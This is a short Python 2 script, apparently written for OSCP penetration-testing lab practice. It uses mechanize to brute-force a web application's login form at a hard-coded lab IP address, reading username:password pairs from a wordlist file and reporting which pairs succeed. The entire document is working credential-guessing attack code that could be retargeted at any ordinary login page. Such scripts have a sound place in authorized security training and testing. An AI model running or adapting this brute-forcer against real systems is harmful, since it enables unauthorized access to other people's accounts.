#!/usr/bin/env python

import mechanize

# target=auth&mode=login&csid=9d6184589692dbaf4adc9704ed8163e3&redirect_url=index.php%3Ftarget%3Dauth%26mode%3Dlogin_form&user_login=&password=
from string import rstrip

#url = "http://10.11.1.133/index.asp"
url = "http://10.11.1.24/index.php"
browser = mechanize.Browser()
#output = open('/mnt/64G/proj/oscp/bruteout.txt', 'w')
submittag = "Enter"
with open('/root/data/oscp_prep/repo/userpass.txt') as userpass:
    print userpass
    for line in userpass:
        up = rstrip(line)
        if ":" in up:
            user, password = up.split(":")
            print "User: " + user + " Password: " + password
            browser.open(url)
            browser.select_form(nr=0)
            browser["user_login"] = user
            browser["password"] = password
            # browser["submit"] = submittag
            res = browser.submit()
            content = res.read()
            if content.find('input type="password" name="password"') > 0:
                print "login failed"
            else:
                print "login SUCCEEDED"
            # output.write(content)
            # output.write("=================================================")

#output.close()
